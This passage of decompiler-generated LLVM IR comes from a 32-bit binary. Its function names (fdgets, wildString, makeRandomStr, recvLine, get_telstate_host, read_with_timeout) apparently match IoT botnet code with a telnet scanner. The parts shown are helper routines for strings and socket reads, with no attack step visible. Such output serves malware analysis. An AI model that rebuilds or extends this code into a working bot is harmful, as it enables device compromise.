  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805e700.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_80562e0.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp13, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp13, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge6 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp13, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp13, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.7 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.7, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_8048e37 ], [ %storemerge5, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f41 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f41, i32* %stack_var_-4, align 4
  %v0_8048f44 = load i32, i32* @ebx, align 4
  store i32 %v0_8048f44, i32* %stack_var_-8, align 4
  %v5_8048f5d = ptrtoint i8* %arg1 to i32
  %v5_8048fa325 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048fa325, label %dec_label_pc_8048f58, label %dec_label_pc_8048fa5

dec_label_pc_8048f58:                             ; preds = %entry, %dec_label_pc_8048f58
  %storemerge26 = phi i32 [ %v4_8048f9a, %dec_label_pc_8048f58 ], [ 0, %entry ]
  %v6_8048f5d = add i32 %storemerge26, %v5_8048f5d
  store i32 %v6_8048f5d, i32* @ebx, align 4
  %v1_8048f60 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_8048f75 = udiv i32 %v1_8048f60, 26
  %tmp = mul i32 %v2_8048f75, -10
  %v2_8048f8d = add i32 %v1_8048f60, %tmp
  %v14_8048f8d = trunc i32 %v2_8048f8d to i8
  %v2_8048f96 = add i8 %v14_8048f8d, 65
  %v2_8048f98 = load i32, i32* @ebx, align 4
  %v3_8048f98 = inttoptr i32 %v2_8048f98 to i8*
  store i8 %v2_8048f96, i8* %v3_8048f98, align 1
  %v4_8048f9a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_8048f9a, %arg2
  br i1 %exitcond, label %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, label %dec_label_pc_8048f58

dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge: ; preds = %dec_label_pc_8048f58
  %v2_8048fa8.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8048fa9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048fa5

dec_label_pc_8048fa5:                             ; preds = %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, %entry
  %v2_8048fa9 = phi i32 [ %v2_8048fa9.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f41, %entry ]
  %v2_8048fa8 = phi i32 [ %v2_8048fa8.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f44, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048fa8, i32* @ebx, align 4
  store i32 %v2_8048fa9, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048f9a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048f58, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048fae = load i32, i32* @edi, align 4
  store i32 %v0_8048fae, i32* %stack_var_-8, align 4
  %v4_8048fb8 = ptrtoint i8* %arg2 to i32
  %v1_8048fc0 = and i32 %v4_8048fb8, -256
  %v5_8048fc2 = call i8* @_memset(i8* %arg2, i32 %v1_8048fc0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8048fe2 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048fe2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048fe9 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_8048ff6 = udiv i32 %arg1, 32
  %v1_8048ffc = urem i32 %arg1, 32
  %v0_8048fff = load i32, i32* @ebp, align 4
  %v2_8048fff = mul nuw nsw i32 %v2_8048ff6, 4
  %v3_8048fff = add nsw i32 %v2_8048fff, -164
  %v4_8048fff = add i32 %v3_8048fff, %v0_8048fff
  %v5_8048fff = inttoptr i32 %v4_8048fff to i32*
  %v6_8048fff = load i32, i32* %v5_8048fff, align 4
  %v9_8048fff = shl i32 1, %v1_8048ffc
  %v12_8048fff = or i32 %v6_8048fff, %v9_8048fff
  store i32 %v12_8048fff, i32* %v5_8048fff, align 4
  %v1_804900a = add i32 %arg1, 1
  %v2_804900b = ptrtoint i32* %stack_var_-176 to i32
  %v6_8049034 = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp33 = icmp slt i32 %v6_8049034, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_80490eb, label %dec_label_pc_80490e1.preheader

dec_label_pc_80490e1.preheader:                   ; preds = %entry
  %v7_80490e546 = icmp sgt i32 %tmp11, 9
  br i1 %v7_80490e546, label %dec_label_pc_80490eb, label %dec_label_pc_804904b

dec_label_pc_804904b:                             ; preds = %dec_label_pc_80490e1.preheader, %dec_label_pc_80490de
  %stack_var_-36.047 = phi i32 [ %v4_80490de, %dec_label_pc_80490de ], [ %tmp11, %dec_label_pc_80490e1.preheader ]
  %v0_804904b = load i32, i32* @global_var_805a6e0.18, align 32
  %v3_804905b = call i32 @Rootsprintf(i32 %v0_804904b, i32 ptrtoint ([5 x i8]* @global_var_80566e0.19 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8048fe2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049085 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v0_804909b = load i32, i32* @ebp, align 4
  %v4_804909b = add i32 %v3_8048fff, %v0_804909b
  %v5_804909b = inttoptr i32 %v4_804909b to i32*
  %v6_804909b = load i32, i32* %v5_804909b, align 4
  %v12_804909b = or i32 %v6_804909b, %v9_8048fff
  store i32 %v12_804909b, i32* %v5_804909b, align 4
  %v6_80490d0 = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp35 = icmp slt i32 %v6_80490d0, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_80490eb, label %dec_label_pc_80490de

dec_label_pc_80490de:                             ; preds = %dec_label_pc_804904b
  %v4_80490de = add nsw i32 %stack_var_-36.047, 1
  %v7_80490e5 = icmp sgt i32 %stack_var_-36.047, 8
  br i1 %v7_80490e5, label %dec_label_pc_80490eb, label %dec_label_pc_804904b

dec_label_pc_80490eb:                             ; preds = %dec_label_pc_80490e1.preheader, %dec_label_pc_804904b, %dec_label_pc_80490de, %entry
  %v2_804910f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049155

dec_label_pc_80490fa:                             ; preds = %dec_label_pc_8049155
  %v0_80490fa = load i32, i32* @global_var_805a6e0.18, align 32
  %v5_804911c = call i32 @__libc_recv(i32 %v0_80490fa, i32 %v2_804910f, i32 1, i32 0)
  %v9_8049121 = icmp eq i32 %v5_804911c, 1
  br i1 %v9_8049121, label %dec_label_pc_8049138, label %dec_label_pc_8049126

dec_label_pc_8049126:                             ; preds = %dec_label_pc_80490fa
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049172

dec_label_pc_8049138:                             ; preds = %dec_label_pc_80490fa
  %v3_8049138 = load i8, i8* %stack_var_-177, align 1
  %v4_804913f = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049138, i8* %stack_var_-32.0, align 1
  %v5_8049144 = add i32 %v4_804913f, 1
  %v22_8049144 = inttoptr i32 %v5_8049144 to i8*
  %v3_8049147 = load i8, i8* %stack_var_-177, align 1
  %v10_804914e = icmp eq i8 %v3_8049147, 10
  br i1 %v10_804914e, label %dec_label_pc_8049163, label %dec_label_pc_8049152

dec_label_pc_8049152:                             ; preds = %dec_label_pc_8049138
  %v4_8049152 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049155

dec_label_pc_8049155:                             ; preds = %dec_label_pc_80490eb, %dec_label_pc_8049152
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80490eb ], [ %v22_8049144, %dec_label_pc_8049152 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80490eb ], [ %v4_8049152, %dec_label_pc_8049152 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80490eb ], [ %v4_8049155, %dec_label_pc_8049152 ]
  %v4_8049155 = add i32 %stack_var_12.0, -1
  %v9_8049155 = sub i32 0, %stack_var_12.0
  %v10_8049155 = and i32 %stack_var_12.0, %v9_8049155
  %v11_8049155 = icmp slt i32 %v10_8049155, 0
  %v12_8049155 = icmp eq i32 %v4_8049155, 0
  %v13_8049155 = icmp slt i32 %v4_8049155, 0
  %v3_8049159 = icmp eq i1 %v13_8049155, %v11_8049155
  %v4_8049159 = icmp eq i1 %v12_8049155, false
  %v5_8049159 = and i1 %v4_8049159, %v3_8049159
  %v4_804915f = icmp eq i1 %v5_8049159, false
  %v1_8049161 = icmp eq i1 %v4_804915f, false
  br i1 %v1_8049161, label %dec_label_pc_80490fa, label %dec_label_pc_8049163

dec_label_pc_8049163:                             ; preds = %dec_label_pc_8049138, %dec_label_pc_8049155
  %stack_var_-32.1 = phi i8* [ %v22_8049144, %dec_label_pc_8049138 ], [ %stack_var_-32.0, %dec_label_pc_8049155 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8049172

dec_label_pc_8049172:                             ; preds = %dec_label_pc_8049126, %dec_label_pc_8049163
  %storemerge = phi i32 [ -1, %dec_label_pc_8049126 ], [ %stack_var_-28.0, %dec_label_pc_8049163 ]
  %v2_804917e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804917e, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049155, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8049144, { 1, 0 }
  uselistorder i32 %v2_8048fe2, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049172, { 1, 0 }
  uselistorder label %dec_label_pc_8049163, { 1, 0 }
  uselistorder label %dec_label_pc_8049155, { 1, 0 }
  uselistorder label %dec_label_pc_80490eb, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804904b, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_8049181 = load i32, i32* @ebp, align 4
  %v1_804918a = add i32 %tmp1, 4
  %v2_804918a = inttoptr i32 %v1_804918a to i32*
  %v3_804918a = load i32, i32* %v2_804918a, align 4
  %v1_8049196 = call i32 @__GI_inet_ntoa(i32 %v3_804918a)
  store i32 %v0_8049181, i32* @ebp, align 4
  ret i32 %v1_8049196
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80491a0 = load i32, i32* @edi, align 4
  store i32 %v0_80491a0, i32* %stack_var_-8, align 4
  %v1_80491aa = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_80491af = and i32 %tmp8, -256
  %v5_80491b1 = call i8* @_memset(i8* %v1_80491aa, i32 %v1_80491af, i32 %tmp9)
  %v4_80491ce = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_80491e3 = inttoptr i32 %tmp1 to i32*
  %v3_80491e3 = call i32 @contains_string(i32 %tmp8, i32* %v2_80491e3)
  %v1_80491e8 = icmp ne i32 %v3_80491e3, 0
  %storemerge = zext i1 %v1_80491e8 to i32
  %v2_8049202 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049202, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804922c = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_8049233 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_8049240 = udiv i32 %arg1, 32
  %v1_8049246 = urem i32 %arg1, 32
  %v0_8049249 = load i32, i32* @ebp, align 4
  %v2_8049249 = mul nuw nsw i32 %v2_8049240, 4
  %v3_8049249 = add nsw i32 %v2_8049249, -140
  %v4_8049249 = add i32 %v3_8049249, %v0_8049249
  %v5_8049249 = inttoptr i32 %v4_8049249 to i32*
  %v6_8049249 = load i32, i32* %v5_8049249, align 4
  %v9_8049249 = shl i32 1, %v1_8049246
  %v12_8049249 = or i32 %v6_8049249, %v9_8049249
  store i32 %v12_8049249, i32* %v5_8049249, align 4
  %v1_8049254 = add i32 %arg1, 1
  %v4_804925b = ptrtoint i32* %stack_var_-152 to i32
  %v5_804927c = call i32 @__libc_select(i32 %v1_8049254, i32 %v2_804922c, i32 0, i32 0, i32 %v4_804925b)
  %tmp19 = icmp slt i32 %v5_804927c, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8049291, label %dec_label_pc_80492b8

dec_label_pc_8049291:                             ; preds = %entry
  %v4_80492ad = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_80492b8

dec_label_pc_80492b8:                             ; preds = %entry, %dec_label_pc_8049291
  %storemerge = phi i32 [ %v4_80492ad, %dec_label_pc_8049291 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
